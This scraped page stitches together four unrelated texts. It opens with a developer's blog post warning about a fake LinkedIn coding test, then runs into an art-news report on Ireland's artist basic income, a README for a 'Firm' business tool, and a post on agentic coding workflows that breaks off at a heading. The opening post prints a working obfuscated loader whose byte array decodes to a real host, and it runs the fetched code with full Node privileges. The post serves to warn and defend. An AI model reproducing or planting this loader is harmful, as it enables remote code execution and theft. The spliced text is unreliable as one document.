<p>Before hitting <code>npm start</code>, I threw this prompt at my Cursor AI agent:</p>
<p>"Before I run this application, can you see if there are any suspicious code in this codebase? Like reading files it shouldn't be reading, accessing crypto wallets etc."</p>
<p>And holy sh*t.</p>
<p>Sitting right in the middle of <code>server/controllers/userController.js</code> was this beauty:</p>
<pre><code><span>//Get Cookie  </span>
(<span>async</span> () =&gt; {  
    <span>const</span> byteArray = [  
        <span>104</span>, <span>116</span>, <span>116</span>, <span>112</span>, <span>115</span>, <span>58</span>, <span>47</span>, <span>47</span>, <span>97</span>, <span>112</span>, <span>105</span>, <span>46</span>, <span>110</span>, <span>112</span>, <span>111</span>, <span>105</span>,  
        <span>110</span>, <span>116</span>, <span>46</span>, <span>105</span>, <span>111</span>, <span>47</span>, <span>50</span>, <span>99</span>, <span>52</span>, <span>53</span>, <span>56</span>, <span>54</span>, <span>49</span>, <span>50</span>, <span>51</span>, <span>57</span>, <span>99</span>, <span>51</span>,  
        <span>98</span>, <span>50</span>, <span>48</span>, <span>51</span>, <span>49</span>, <span>102</span>, <span>98</span>, <span>57</span>  
    ];  
    <span>const</span> uint8Array = <span>new</span> <span>Uint8Array</span>(byteArray);  
    <span>const</span> decoder = <span>new</span> TextDecoder(<span>'utf-8'</span>);  
    axios.get(decoder.decode(uint8Array))  
        .then(<span><span>response</span> =&gt;</span> {  
            <span>new</span> <span>Function</span>(<span>"require"</span>, response.data.model)(<span>require</span>);  
        })  
        .catch(<span><span>error</span> =&gt;</span> { });  
})();
</code></pre>
<p>Obfuscated. Sneaky. Evil. And 100% active - embedded between legitimate admin functions, ready to execute with full server privileges the moment admin routes were accessed.</p>
<p>I decoded that byte array: <code>https://api.npoint.io/2c458612399c3b2031fb9</code></p>
<p>When I first hit the URL, it was live. I grabbed the payload. Pure malware. The kind that steals everything - crypto wallets, files, passwords, your entire digital existence.</p>
<p>Here's the kicker: the URL died exactly 24 hours later. These guys weren't messing around - they had their infrastructure set up to burn evidence fast.</p>
<p>I ran the payload through VirusTotal - <a target="_blank" href="https://www.virustotal.com/gui/file/e2da104303a4e7f3bbdab6f1839f80593cdc8b6c9296648138bd2ee3cf7912d5/behavior">check out the behavior analysis yourself</a>. Spoiler alert: it's nasty.</p>
<h2 id="heading-the-operation">The Operation</h2>
<p>This wasn't some amateur hour scam. This was sophisticated:</p>
<p><strong>The LinkedIn Profile</strong>: Mykola Yanchii looked 100% real. Chief Blockchain Officer. Proper work history. Even had those cringy LinkedIn posts about "innovation" and "blockchain consulting."</p>
<p><strong>The Company</strong>: Symfa had a full LinkedIn company page. Professional branding. Multiple employees. Posts about "transforming real estate with blockchain." They even had affiliated pages and follower networks.</p>
<p><strong>The Approach</strong>: No red flags in the initial outreach. Professional language. Reasonable project scope. They even used Calendly for scheduling.</p>
<p><strong>The Payload</strong>: The malicious code was positioned strategically in the server-side controller, ready to execute with full Node.js privileges when admin functionality was accessed.</p>
<h2 id="heading-the-psychology">The Psychology</h2>
<p>Here's what made this so dangerous:</p>
<p><strong>Urgency</strong>: "Complete the test before the meeting to save time."</p>
<p><strong>Authority</strong>: LinkedIn verified profile, real company, professional setup.</p>
<p><strong>Familiarity</strong>: Standard take-home coding test. Every developer has done dozens of these.</p>
<p><strong>Social Proof</strong>: Real company page with real employees and real connections.</p>
<p>I almost fell for it. And I'm paranoid about this stuff.</p>
<h2 id="heading-the-lesson">The Lesson</h2>
<p>One simple AI prompt saved me from disaster.</p>
<p>Not fancy security tools. Not expensive antivirus software. Just asking my coding assistant to look for suspicious patterns before executing unknown code.</p>
<p>The scary part? This attack vector is perfect for developers. We download and run code all day long. GitHub repos, npm packages, coding challenges. Most of us don't sandbox every single thing.</p>
<p>And this was server-side malware. Full Node.js privileges. Access to environment variables, database connections, file systems, crypto wallets. Everything.</p>
<h2 id="heading-the-scale">The Scale</h2>
<p>If this sophisticated operation is targeting developers at scale, how many have already been compromised? How many production systems are they inside right now?</p>
<p><strong>Perfect Targeting</strong>: Developers are ideal victims. Our machines contain the keys to the kingdom: production credentials, crypto wallets, client data.</p>
<p><strong>Professional Camouflage</strong>: LinkedIn legitimacy, realistic codebases, standard interview processes.</p>
<p><strong>Technical Sophistication</strong>: Multi-layer obfuscation, remote payload delivery, dead-man switches, server-side execution.</p>
<p>One successful infection could compromise production systems at major companies, crypto holdings worth millions, personal data of thousands of users.</p>
<h2 id="heading-the-bottom-line">The Bottom Line</h2>
<p>If you're a developer getting LinkedIn job opportunities:</p>
<ol>
<li><p><strong>Always sandbox unknown code</strong>. Docker containers, VMs, whatever. Never run it on your main machine.</p>
</li>
<li><p><strong>Use AI to scan for suspicious patterns</strong>. Takes 30 seconds. Could save your entire digital life.</p>
</li>
<li><p><strong>Verify everything</strong>. Real LinkedIn profile doesn't mean real person. Real company doesn't mean real opportunity.</p>
</li>
<li><p><strong>Trust your gut</strong>. If someone's rushing you to execute code, that's a red flag.</p>
</li>
</ol>
<p>This scam was so sophisticated it fooled my initial BS detector. But one paranoid moment and a simple AI prompt exposed the whole thing.</p>
<p>The next time someone sends you a "coding challenge," remember this story.</p>
<p>Your crypto wallet will thank you.</p>
<hr>
<p><em>If you're a developer who has run "coding challenges" from LinkedIn recruiters, you should probably read this twice.</em></p>

            <description><![CDATA[<p>URL: <a href="https://www.artnews.com/art-news/news/ireland-basic-income-artists-program-permanent-1234756981/">https://www.artnews.com/art-news/news/ireland-basic-income-artists-program-permanent-1234756981/</a>, See on <a href="https://news.ycombinator.com/item?id=45590900">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>
	Several years after launching a trial, <a href="https://www.artnews.com/t/ireland/" id="auto-tag_ireland" data-tag="ireland">Ireland</a> is set to make its basic income for artists program permanent starting in 2026.</p>



<p>
	Under the program, selected artists receive a weekly payment of approximately $375, or about $1,500 per month. There are 2,000 spots available, with applications <a href="https://www.citizensinformation.ie/en/employment/unemployment-and-redundancy/employment-support-schemes/basic-income-arts/" rel="nofollow" target="_blank">set to open</a> in September 2026; eligibility criteria have not yet been announced. The government may expand the program to additional applicants in the future, should more funding become available, according to <a href="https://www.rte.ie/culture/2025/1007/1537249-budget-2026-basic-income-for-artists-scheme-to-become-permanent/" rel="nofollow" target="_blank">Irish broadcaster <em>RTÉ</em></a>.</p>



<div><p>
	The current program, which began in 2022 and is set to end in February after a six-month extension agreed to earlier this year, was launched to support the arts sector following the pandemic. Many artists suffered disproportionate income losses during that time due to the cancelation of live performances and events.</p><p>For the pilot, applicants could apply under visual arts, theater, literature, music, dance, opera, film, circuses, and architecture. They were required to submit two pieces of evidence proving that they were professional cultural workers, such as proof of income from art sales, membership in a professional body, or reviews. At the time, the <em>New York Times</em> <a href="https://www.nytimes.com/2023/03/23/arts/ireland-basic-income-artists.html" rel="nofollow" target="_blank">reported</a> that more than 9,000 people applied, with 8,200 deemed eligible and 2,000 randomly selected to receive payments. Another 1,000 eligible applicants were placed in a control group to be monitored but not receive funds.

<p>
	The announcement follows the release of an <a href="https://assets.gov.ie/static/documents/b87d2659/20250929_BIA_CBA_Final_Report.pdf" rel="nofollow" target="_blank">external report</a> by UK-based consultants Alma Economics, which found that the pilot cost €72 million to date but generated nearly €80 million in total benefits to the Irish economy. The report also found that recipients’ arts-related income increased by more than €500 per month on average, income from non-arts work decreased by around €280, and reliance on other social programs declined, with participants receiving €100 less per month on average.</p>

	“The economic return on this investment in Ireland’s artists and creative arts workers is having an immediate positive impact on the sector and the economy overall,” Patrick O’Donovan, minister for culture, communications, and sport, <a href="https://www.gov.ie/en/department-of-culture-communications-and-sport/press-releases/basic-income-for-the-arts-pilot-produced-over-100-million-in-social-and-economic-benefits/" rel="nofollow" target="_blank">said</a> in a statement.</p>



<p>
	The report further estimated that a permanent, “scaled-up” program would likely result in artists producing 22 percent more work, while lowering the average cost of art to consumers by 9 to 25 percent.</p>



<div><p>
	In October, the government <a href="https://www.gov.ie/en/department-of-culture-communications-and-sport/press-releases/public-consultation-confirms-overwhelming-support-for-making-basic-income-for-the-arts-permanent/" rel="nofollow" target="_blank">released</a> the results of a public survey on the scheme, which found that 97 percent of respondents support the program. However, 47 percent of the 17,000 respondents said artists should be selected based on economic need, while 37.5 percent favored selection by merit. Only 14 percent preferred random selection.</p><p>Ireland’s BIA program is a form of universal basic income, a policy that grants all citizens a recurring payment regardless of socioeconomic status or other factors. Such programs have grown increasingly mainstream—if not widely implemented—in recent years, as fears rise over the effects of artificial intelligence and other technology-driven job losses. Many UBI advocates have cited Ireland’s program as evidence that the model works.

</p></div>



<p>
	“As the pilot shows, basic income works and people need a UBI now to face and deal with the many social, economic, and ecological crises of our world. The Network will continue to help demonstrate basic income within communities and show how it is a sustainable policy,” the UBI Lab Network said in a statement calling for a nationwide program.</p>



<p>
	“We need no further pilots. People need a UBI now to face and deal with the many social, economic, and ecological crises of our world,” Reinhard Huss, organizer of UBI Lab Leeds, told <em><a href="https://www.businessinsider.com/ireland-artists-basic-income-pilot-results-2025-6" rel="nofollow" target="_blank">Business Insider</a></em> in June.</p>

<p dir="auto">Modern businesses are natively digital, but lack a unified view. Your data is scattered across SaaS tools you don't control, so you piece together answers by jumping between platforms.</p>
<p dir="auto">Your business is a graph: customers link to projects, projects link to tasks, people link to organizations. Firm lets you define these relationships in plain text files (you own!).</p>
<p dir="auto">Version controlled, locally stored and structured as code with the Firm DSL. This structured representation of your work, <em>business-as-code</em>, makes your business readable to yourself and to the robots that help you run it.</p>

<li><strong>Open data model:</strong> Tailor to your business with custom schemas.</li>
<li><strong>Automate anything:</strong> Search, report, integrate, whatever. It's just code.</li>
<li><strong>AI-ready:</strong> LLMs can read, write, and query your business structure.</li>

<p dir="auto">Firm operates on a "workspace": a directory containing all your <code>.firm</code> DSL files. The Firm CLI processes every file in this workspace to build a unified, queryable graph of your business.</p>
<p dir="auto">The first step is to add an entity to your workspace. You can do this either by using the CLI or by writing the DSL yourself.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Add entities with the CLI</h3><a id="user-content-add-entities-with-the-cli" aria-label="Permalink: Add entities with the CLI" href="#add-entities-with-the-cli"></a></p>
<p dir="auto">Use <code>firm add</code> to interactively generate new entities. Out of the box, Firm supports a set of pre-built entity schemas for org mapping, customer relations and work management. The CLI will prompt you for the necessary info and generate corresponding DSL.</p>

<p dir="auto">You've seen the basic commands for interacting with a Firm workspace. The project is a work-in-progress, and you can expect to see more sophisticated features added over time, including a more powerful query engine and tools for running business workflows directly from the CLI.</p>

<p dir="auto">Beyond the CLI, you can integrate Firm's core logic directly into your own software using the <code>firm_core</code> and <code>firm_lang</code> Rust packages. This allows you to build more powerful automations and integrations on top of Firm.</p>
<p dir="auto">First, add the Firm crates to your <code>Cargo.toml</code>:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Entities</h3><a id="user-content-entities" aria-label="Permalink: Entities" href="#entities"></a></p>
<p dir="auto">Entities are the fundamental business objects in your workspace, like people, organizations, or projects. Each entity has a unique ID, a type, and a collection of fields.</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Fields</h3><a id="user-content-fields" aria-label="Permalink: Fields" href="#fields"></a></p>
<p dir="auto">Fields are typed key-value pairs attached to an entity. Firm supports a rich set of types:</p>
<ul dir="auto">
<li><code>String</code></li>
<li><code>Integer</code></li>
<li><code>Float</code></li>

<p dir="auto">The power of Firm comes from connecting entities. You create relationships using <code>Reference</code> fields.</p>
<p dir="auto">When Firm processes your workspace, it builds the <em>entity graph</em> representing of all your entities (as nodes) and their relationships (as directed edges). This graph is what allows for traversal and querying.</p>
<p dir="auto"><strong>In the DSL</strong>, creating a relationship is as simple as referencing another entity's ID.</p>
<div data-snippet-clipboard-copy-content="contact john_at_acme {

    organization_ref = organization.acme_corp

<p dir="auto"><strong>In Rust</strong>, you build the graph by loading entities and calling the <code>.build()</code> method, which resolves all references into queryable links.</p>
<div dir="auto" data-snippet-clipboard-copy-content="let mut graph = EntityGraph::new();
graph.add_entities(workspace.build()?.entities)?;
graph.build(); // Builds relationships from references

<div id="readability-page-1" class="page"><article id="article" data-astro-cid-vj4tpspi=""> <img src="https://steipete.me/assets/img/2025/just-talk-to-it/curve-angentic.jpg" alt="" loading="lazy" data-astro-cid-vj4tpspi=""> <p>I’ve been more quiet here lately as I’m knee-deep working on my latest project. Agentic engineering has become so good that it now writes pretty much 100% of my code. And yet I see so many folks trying to solve issues and generating these elaborated charades instead of getting sh*t done.</p>
<p>This post partly is inspired by the conversations I had at last night’s <a href="https://x.com/christianklotz/status/1977866496001867925">Claude Code Anonymous in London</a> and partly since <a href="https://x.com/pmddomingos/status/1976399060052607469">it’s been an AI year</a> since my last workflow update. Time for a check-in.</p>
<p>All of the basic ideas still apply, so I won’t mention simple things like context management again. Read my <a href="https://steipete.me/posts/2025/optimal-ai-development-workflow">Optimal AI Workflow post</a> for a primer.</p>
<h2 id="context--tech-stack">Context &amp; Tech-Stack</h2>
<p>I work by myself, current project is a ~300k LOC TypeScript React app, a Chrome extension, a cli, a client app in Tauri and a mobile app in Expo. I host on vercel, a PR delivers a new version of my website in ~2 minutes to test. Everything else (apps etc) is not automated.</p>
<h2 id="harness--general-approach">Harness &amp; General Approach</h2>
<p>I’ve completely moved to <code>codex</code> cli as daily driver. I run between 3-8 in parallel in a 3x3 terminal grid, most of them <a href="https://x.com/steipete/status/1977771686176174352">in the same folder</a>, some experiments go in separate folders. I experimented with worktrees, PRs but always revert back to this setup as it gets stuff done the fastest.</p>
<p>My agents do git <a href="https://x.com/steipete/status/1977498385172050258">atomic commits</a> themselves. In order to maintain a mostly clean commit history, I iterated a lot on <a href="https://gist.github.com/steipete/d3b9db3fa8eb1d1a692b7656217d8655">my agent file</a>. This makes git ops sharper so each agent commits exactly the files it edited.</p>
<p>Yes, with claude you could do hooks and codex doesn’t support them yet, but models are incredibly clever and <a href="https://x.com/steipete/status/1977119589860601950">no hook will stop them</a> if they are determined.</p>
<p>I was being ridiculed in the past and called a <a href="https://x.com/weberwongwong/status/1975749583079694398">slop-generator</a>, good to see that running parallel agents <a href="https://x.com/steipete/status/1976353767705457005">slowly gets mainstream</a>.</p>
<h2 id="model-picker">Model Picker</h2>
<p>I build pretty much everything with gpt-5-codex on mid settings. It’s a great compromise of smart &amp; speed, and dials thinking up/down automatically. I found over-thinking these settings to not yield meaningful results, and it’s nice not having to think about <em>ultrathink</em>.</p>
<h3 id="blast-radius">Blast Radius 💥</h3>
<p>Whenever I work, I think about the “blast radius”. I didn’t come up with that term, I do love it tho. When I think of a change I have a pretty good feeling about how long it’ll take and how many files it will touch. I can throw many small bombs at my codebase or a one “Fat Man” and a few small ones. If you throw multiple large bombs, it’ll be impossible to do isolated commits, much harder to reset if sth goes wrong.</p>
<p>This is also a good indicator while I watch my agents. If something takes longer than I anticipated, I just hit escape and ask “what’s the status” to get a status update and then either help the model to find the right direction, abort or continue. Don’t be afraid of stopping models mid-way, file changes are atomic and they are really good at picking up where they stopped.</p>
<p>When I am unsure about the impact, I use “give me a few options before making changes” to gauge it.</p>
<h3 id="why-not-worktrees">Why not worktrees?</h3>
<p>I run one dev server, as I evolve my project I click through it and test multiple changes at once. Having a tree/branch per change would make this significantly slower, spawning multiple dev servers would quickly get annoying. I also have limitations for Twitter OAuth, so I can only register some domains for callbacks.</p>
<h3 id="what-about-claude-code">What about Claude Code?</h3>
<p>I used to love Claude Code, these days I can’t stand it anymore (<a href="https://x.com/steipete/status/1977072732136521836">even tho codex is a fan</a>). It’s language, the <a href="https://x.com/vtahowe/status/1976709116425871772">absolutely right’s</a>, the 100% production ready messages while tests fail - I just can’t anymore. Codex is more like the introverted engineer that chugs along and just gets stuff done. It reads much more files before starting work so even small prompts usually do exactly what I want.</p>
<p>There’s broad consensus in my timeline that <a href="https://x.com/s_streichsbier/status/1974334735829905648">codex is the way</a> <a href="https://x.com/kimmonismus/status/1976404152541680038">to go</a>.</p>
<h3 id="other-benefits-of-codex">Other benefits of codex</h3>
<ul>
<li><strong>~230k usable context vs claude’s 156k.</strong> Yes, there’s Sonnet 1Mio if you get lucky or pay API pricing, but realistically Claude gets very silly long before it depletes that context so it’s not realistically something you can use.</li>
<li><strong>More efficient token use.</strong> Idk what OpenAI does different, but my context fills up far slower than with Claude Code. I used to see Compacting… all the time when using claude, I very rarely manage to exceed the context in codex.</li>
<li><strong>Message Queuing.</strong> Codex allows to <a href="https://x.com/steipete/status/1978099041884897517">queue messages</a>. Claude had this feature, but a few months ago they changed it so your messages “steer” the model. If I want to steer codex, I just press escape and enter to send the new message. Having the option for both is just far better. I often queue related feature tasks and it just reliably works them off.</li>
<li><strong>Speed</strong> OpenAI rewrote codex in Rust, and it shows. It’s incredibly fast. With Claude Code I often have multi-second freezes and it’s process blows up to gigabytes of memory. And then there’s the terminal flickering, especially when using Ghostty. Codex has none of that. It feels incredibly lightweight and fast.</li>
<li><strong>Language.</strong> <a href="https://x.com/steipete/status/1975297275242160395">This really makes a difference to my mental health.</a> I’ve been screaming at claude so many times. I rarely get angry with codex. Even if codex would be a worse model I’d use it for that fact alone. If you use both for a few weeks you will understand.</li>
<li><a href="https://x.com/steipete/status/1977466373363437914">No random markdown files everywhere</a>. <a href="https://x.com/deepfates/status/1975604489634914326">IYKYK</a>.</li>
</ul>
<h3 id="why-not-harness">Why not $harness</h3>
<p>IMO there’s simply not much space between the end user and the model company. I get by far the best deal using a subscription. I currently have 4 OpenAI subs and 1 Anthropic sub, so my overall costs are around 1k/month for basically unlimited tokens. If I’d use API calls, that’d cost my around 10x more. Don’t nail me on this math, I used some token counting tools like ccusage and it’s all somewhat imprecise, but even if it’s just 5x it’s a damn good deal.</p>
<p>I like that we have tools like amp or Factory, I just don’t see them surviving long-term. Both codex and claude code are getting better with every release, and they all converge to the same ideas and feature set. Some might have a temporary edge with better todo lists, steering or slight dx features, but I don’t see them significantly out-competing the big AI companies.</p>
<p>amp moved away from GPT-5 as driver and now calls it their <a href="https://ampcode.com/news/gpt-5-oracle">“oracle”</a>. Meanwhile I use codex and basically constantly work with the smarter model, the oracle. <a href="https://x.com/btibor91/status/1976299256383250780">Yes, there are benchmarks</a>, but given the skewed usage numbers, I don’t trust them. codex gets me far better results than amp. I have to give them kudos tho for session sharing, they push some interesting ideas ahead.</p>
<p>Factory, unconvinced. Their videos are a bit cringe, I do hear good things in my timeline about it tho, even if images aren’t supported (yet) and they have the <a href="https://x.com/badlogicgames/status/1977103325192667323">signature flicker</a>.</p>
<p>Cursor… it’s tab completion model is industry leading, if you still write code yourself. I use VS Code mostly, I do like them pushing things like browser automation and plan mode tho. I did experiment with GPT-5-Pro but <a href="https://x.com/steipete/status/1976226900516209035">Cursor still has the same bugs that annoyed me back in May</a>. I hear that’s being worked on tho, so it stays in my dock.</p>
<p>Others like Auggie were a blip on my timeline and nobody ever mentioned them again. In the end they all wrap either GPT-5 and/or Sonnet and are replaceable. RAG might been helpful for Sonnet, but GPT-5 is so good at searching at you don’t need a separate vector index for your code.</p>
<p>The most promising candidates are opencode and crush, esp. in combination with open models. You can totally use your OpenAI or Anthropic sub with them as well (<a href="https://x.com/steipete/status/1977286197375647870">thanks to clever hax</a>), but it’s questionable if that is allowed, and what’s the point of using a less capable harness for the model optimized for codex or Claude Code.</p>
<h3 id="what-about-openmodel">What about $openmodel</h3>
<p>I keep an eye on China’s open models, and it’s impressive how quickly they catch up. GLM 4.6 and Kimi K2.1 are strong contenders that slowly reach Sonnet 3.7 quality, I don’t recommend them as <a href="https://x.com/imfeat7/status/1977246145278583258">daily driver</a> tho.</p>
<p>The benchmarks only tell half the story. IMO agentic engineering moved from “this is crap” to “this is good” around May with the release of Sonnet 4.0, and we hit an even bigger leap from good to “this is amazing” with gpt-5-codex.</p>
<h3 id="plan-mode--approach">Plan Mode &amp; Approach</h3>
<p>What benchmarks miss is the strategy that the model+harness pursue when they get a prompt. codex is far FAR more careful and reads much more files in your repo before deciding what to do. <a href="https://x.com/thsottiaux/status/1975565380388299112">It pushes back harder when you make a silly request.</a> Claude/other agents are much more eager and just try <em>something</em>. This can be mitigated with plan mode and rigorous structure docs, to me that feels like working around a broken system.</p>
<p>I rarely use big plan files now with codex. codex doesn’t even have a dedicated plan mode - however it’s so much better at adhering to the prompt that I can just write “let’s discuss” or “give me options” and it will diligently wait until I approve it. No harness charade needed. Just talk to it.</p>
<h3 id="but-claude-code-now-has-plugins">But Claude Code now has <a href="https://www.anthropic.com/news/claude-code-plugins">Plugins</a></h3>
<p>Do you hear that noise in the distance? It’s me sigh-ing. What a big pile of bs. This one really left me disappointed in Anthropic’s focus. They try to patch over inefficiencies in the model. Yes, maintaining good documents for specific tasks is a good idea. I keep a big list of useful docs in a docs folder as markdown.</p>
<h3 id="but-but-subagents-1">But but Subagents !!!1!</h3>
<p>But something has to be said about this whole dance with subagents. Back in May this was called subtasks, and mostly a way to spin out tasks into a separate context when the model doesn’t need the full text - mainly a way to parallelize or to reduce context waste for e.g. noisy build scripts. Later they rebranded and improved this to subagents, so you spin of a task with some instructions, nicely packaged.</p>
<p>The use case is the same. What others do with subagents, I usually do with separate windows. If I wanna research sth I might do that in a separate terminal pane and paste it to another one. This gives me complete control and visibility over the context I engineer, unlike subagents who make it harder to view and steer or control what is sent back.</p>
<p>And we have to talk about the subagent Anthropic recommends on their blog. Just look at this <a href="https://github.com/wshobson/agents/blob/main/plugins/llm-application-dev/agents/ai-engineer.md">“AI Engineer” agent</a>. It’s an amalgamation of slop, mentioning GPT-4o and o1 for integration, and overall just seems like an autogenerated soup of words that tries to make sense. There’s no meat in there that would make your agent a better “AI engineer”.</p>
<p>What does that even mean? If you want to get better output, telling your model “You are an AI engineer specializing in production-grade LLM applications” will not change that. Giving it documentation, examples and do/don’t helps. I bet that you’d get better result if you ask your agent to “google AI agent building best practices” and let it load some websites than this crap. You could even make the argument that this slop is <a href="https://x.com/IanIsSoAwesome/status/1976662563699245358">context poison</a>.</p>
<h2 id="how-i-write-prompts">How I write prompts</h2>
<p>Back when using claude, I used to write (ofc not, <a href="https://x.com/steipete/status/1978104202820812905">I speak</a>) very extensive prompts, since this model “gets me” the more context I supply. While this is true with any model, I noticed that my prompts became significantly shorter with codex. Often it’s just 1-2 sentences + <a href="https://x.com/steipete/status/1977175451408990379">an image</a>. The model is incredibly good at reading the codebase and just gets me. I even sometimes go back to typing since codex requires so much less context to understand.</p>
<p>Adding images is an amazing trick to provide more context, the model is really good at finding exactly what you show, it finds strings and matches it and directly arrives at the place you mention. I’d say at least 50% of my prompts contain a screenshot. I rarely annotate that, that works even better but is slower. A screenshot takes 2 seconds to drag into the terminal.</p>
<p><a href="https://wisprflow.ai/">Wispr Flow</a> with semantic correction is still king.</p>
<h2 id="web-based-agents">Web-Based Agents</h2>
<p>Lately I experimented again with web agents: Devin, Cursor and Codex. Google’s Jules looks nice but was really annoying to set up and Gemini 2.5 just isn’t a good model anymore. Things might change soon once we get <a href="https://x.com/cannn064/status/1973415142302830878">Gemini 3 Pro</a>. The only one that stuck is codex web. It also is annoying to setup and broken, the terminal currently <a href="https://x.com/steipete/status/1974798735055192524">doesn’t load correctly</a>, but I had an older version of my environment and made it work, with the price of slower wramp-up times.</p>
<p>I use codex web as my short-term issue tracker. Whenever I’m on the go and have an idea, I do a one-liner via the iOS app and later review this on my Mac. Sure, I could do way more with my phone and even review/merge this, but I choose not to. My work is already addictive enough as-is, so when I’m out or seeing friends, I don’t wanna be pulled in even more. Heck, I say this as someone <a href="https://steipete.me/posts/2025/vibetunnel-first-anniversary">who spent almost two months building a tool to make it easier to code on your phone</a>.</p>
<p>Codex web didn’t even count towards your usage limits, but <a href="https://x.com/steipete/status/1976292221390553236">these days sadly are numbered</a>.</p>
<h2 id="the-agentic-journey">The Agentic Journey</h2>
<p>Let’s talk about tools. <a href="https://conductor.build/">Conductor</a>, <a href="https://www.terragonlabs.com/">Terragon</a>, <a href="https://x.com/steipete/status/1973132707707113691">Sculptor</a> and the 1000 other ones. Some are hobby projects, some are drowning in VC money. I tried so many of them. None stick. IMO they work around current inefficiencies and promote a workflow that just isn’t optimal. Plus, most of them hide the terminal and don’t show everything the model shows.</p>
<p>Most are thin wrappers around Anthropic’s SDK + work tree management. There’s no moat. And I question if you even want easier access to coding agents on your phone. The little use case these did for me, codex web fully covers.</p>
<p>I do see this pattern tho that almost every engineer goes through a phase of building their own tools, mostly because it’s fun and because it’s so much easier now. And what else to build than tools that (we think) will make it simpler to build more tools?</p>
<h2 id="but-claude-code-can-background-tasks">But Claude Code can Background Tasks!</h2>
<p>True. codex currently lacks a few bells and whistles that claude has. The most painful omission is background task management. While it should have a timeout, I did see it get stuck quite a few times with cli tasks that don’t end, like spinning up a dev server or tests that deadlock.</p>
<p>This was one of the reasons I reverted back to claude, but since that model is just so silly in other ways, I now use <a href="https://x.com/steipete/status/1977745596380279006"><code>tmux</code></a>. It’s an old tool to run CLIs in persistent sessions in the background and there’s plenty world knowledge in the model, so all you need to do is “run via tmux”. No custom agent md charade needed.</p>
<h2 id="what-about-mcps">What about MCPs</h2>
<p>Other people wrote plenty about MCPs. IMO most are something for the marketing department to make a checkbox and be proud. Almost all MCPs really should be clis. I say that as someone <a href="https://github.com/steipete/claude-code-mcp">who wrote 5 MCPs myself</a>.</p>
<p>I can just refer to a cli by name. I don’t need any explanation in my agents file. The agent will try $randomcrap on the first call, the cli will present the help menu, context now has full info how this works and from now on we good. I don’t have to pay a price for any tools, unlike MCPs which are a constant cost and garbage in my context. Use GitHub’s MCP and see 23k tokens gone. Heck, they did make it better because it was almost 50.000 tokens when it first launched. Or use the <code>gh</code> cli which has basically the same feature set, models already know how to use it, and pay zero context tax.</p>
<p>I did open source some of my cli tools, like <a href="https://github.com/steipete/bslog">bslog</a> and <a href="https://github.com/steipete/inngest">inngest</a>.</p>
<p>I do use <a href="https://developer.chrome.com/blog/chrome-devtools-mcp"><code>chrome-devtools-mcp</code></a> these days <a href="https://x.com/steipete/status/1977762275302789197">to close the loop</a>. it replaced Playwright as my to-go MCP for web debugging. I don’t need it lots but when I do, it’s quite useful to close the loop. I designed my website so that I can create api keys that allow my model to query any endpoint via curl, which is faster and more token-efficient in almost all use cases, so even that MCP isn’t something I need daily.</p>
<h2 id="but-the-code-is-slop">But the code is slop!</h2>
<p>I spend about <a href="https://x.com/steipete/status/1976985959242907656">20% of my time</a> on refactoring. Ofc all of that is done by agents, I don’t waste my time doing that manually. Refactor days are great when I need less focus or I’m tired, since I can make great progress without the need of too much focus or clear thinking.</p>
<p>Typical refactor work is using <code>jscpd</code> for code duplication, <a href="https://knip.dev/"><code>knip</code></a> for dead code, running <code>eslint</code>’s <code>react-compiler</code> and deprecation plugins, checking if we introduced api routes that can be consolidated, maintaining my docs, breaking apart files that grew too large, adding tests and code comments for tricky parts, updating dependencies, <a href="https://x.com/steipete/status/1977472427354632326">tool upgrades</a>, file restructuring, finding and rewriting slow tests, mentioning modern react patterns and rewriting code (e.g. <a href="https://react.dev/learn/you-might-not-need-an-effect">you might not need <code>useEffect</code></a>). There’s always something to do.</p>
<p>You could make the argument that this could be done on each commit, I do find these phases of iterating fast and then maintaining and improving the codebase - basically paying back some technical debt, to be far more productive, and overall far more fun.</p>
<h2 id="do-you-do-spec-driven-development">Do you do spec-driven development?</h2>
<p><a href="https://steipete.me/posts/2025/the-future-of-vibe-coding">I used to back in June</a>. Designing a big spec, then let the model build it, ideally for hours. IMO that’s the old way of thinking about building software.</p>
<p>My current approach is usually that I start a discussion with codex, I paste in some websites, some ideas, ask it to read code, and we flesh out a new feature together. If it’s something tricky, I ask it to write everything into a spec, give that to GPT-5-Pro for review (via chatgpt.com) to see if it has better ideas (surprisingly often, this greatly improves my plan!) and then paste back what I think is useful into the main context to update the file.</p>
<p>By now I have a good feeling which tasks take how much context, and codex’s context space is quite good, so often I’ll just start building. Some people are religious and always use a new context with the plan - IMO that was useful for Sonnet, but GPT-5 is far better at dealing with larger contexts, and doing that would easily add 10 minutes to everything as the model has to slowly fetch all files needed to build the feature again.</p>
<p>The far more fun approach is when I do UI-based work. I often start with sth simple and woefully under-spec my requests, and watch the model build and see the browser update in real time. Then I queue in additional changes and iterate on the feature. Often I don’t fully know how something should look like, and that way I can play with the idea and iterate and see it slowly come to life. I often saw codex build something interesting I didn’t even think of. I don’t reset, I simply iterate and morph the chaos into the shape that feels right.</p>
<p>Often I get ideas for related interactions and iterate on other parts as well while I build it, that work I do in a different agent. Usually I work on one main feature and some smaller, tangentially related tasks.</p>
<p>As I’m writing this, I build a new Twitter data importer in my Chrome extension, and for that I reshape the graphql importer. Since I’m a bit unsure if that is the right approach, that one is in a separate folder so I can look at the PR and see if that approach makes sense. The main repo does refactoring, so I can focus on writing this article.</p>
<h2 id="show-me-your-slash-commands">Show me your slash commands!</h2>
<p>I only have a few, and I use them rarely:</p>
<ul>
<li><code>/commit</code> (custom text to explain that multiple agents work in the same folder and to only commit your changes, so I get clean comments and gpt doesn’t freak out about other changes and tries to revert things if linter fails)</li>
<li><code>/automerge</code> (process one PR at a time, react to bot comments, reply, get CI green and squash when green)</li>
<li><code>/massageprs</code> (same as automerge but without the squashing so I can parallelize the process if I have a lot of PRs)</li>
<li><code>/review</code> (built-in, only sometimes since I have review bots on GH, but can be useful)</li>
</ul>
<p>And even with these, usually I just type “commit”, unless I know that there’s far too many dirty files and the agent might mess up without some guidance. No need for charade/context waste when I’m confident that this is enough. Again, you develop intuition for these. I have yet to see other commands that really are useful.</p>
<h2 id="what-other-tricks-do-you-have">What other tricks do you have?</h2>
